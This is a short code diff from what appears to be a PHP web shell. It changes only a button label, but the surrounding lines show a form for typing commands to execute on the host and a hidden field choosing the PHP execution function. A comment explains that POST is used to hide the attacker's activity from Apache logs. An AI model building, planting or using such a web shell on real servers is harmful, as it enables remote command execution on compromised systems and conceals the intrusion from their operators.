@@ -228,7 +228,7 @@
 	<form action="#" method="post" name="submitCmd" id="submitCmd"><!-- no button here, just hit enter -->
 		<input id="inputCmd" type="text" size="55" placeholder="Type command here to execute on host and hit return" name="cmd"/>
 		<input type="hidden" value="<?php if($_POST['execType'] != ""){echo $_POST['execType'];}else{echo "exec";} ?>" name="execType" id="execType"/>
-		<button type="button" onClick="saveFile();">Download As File</button>
+		<button type="button" onClick="saveFile();">Download File</button>
 	</form><!-- went with POST method to slightly obfuscate the attacker's activity from simple Apache logs -->
 <!-- The band name on the bottom left -->
 <div class="branding">
